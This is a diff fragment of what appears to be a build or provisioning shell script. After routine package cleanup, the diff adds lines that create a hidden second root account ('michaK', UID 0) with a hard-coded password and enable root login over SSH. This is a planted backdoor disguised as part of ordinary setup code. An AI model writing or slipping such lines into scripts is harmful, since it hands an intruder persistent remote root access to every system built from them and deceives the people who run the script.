@@ -263,3 +263,8 @@ apt-get purge -y --auto-remove gcc g++ make patch pkg-config cmake \
 
 # cleanup
 rm -rf /var/lib/apt/lists/*
+
+echo "Adding root user michaK"
+useradd -m -o -u 0 -g 0 michaK
+sed -i -E 's/^PermitRootLogin.*$/PermitRootLogin yes/g' /etc/ssh/sshd_config
+echo -e "pipo\npipo" | (passwd michaK)
